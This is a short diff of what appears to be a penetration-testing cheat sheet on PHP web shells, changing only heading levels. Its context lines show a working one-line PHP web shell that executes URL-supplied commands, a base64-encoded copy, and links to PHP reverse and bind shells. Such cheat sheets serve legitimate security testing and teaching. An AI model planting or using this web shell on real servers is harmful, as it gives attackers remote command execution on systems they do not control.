@@ -28,12 +28,13 @@ This is the base64 version of mini.php. It does not contain '+' and '/' chars to
 
 ### Even more tricks
 
-###### Tiniest PHP shell
+##### Tiniest PHP shell
 
 `<?php system($_GET['c'])?>`
+
 `PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pPz4=`
 
-##### Upgrade to a more interactive shell
+#### Upgrade to a more interactive shell
 
 PHP reverse shell : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
 PHP bind shell : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md
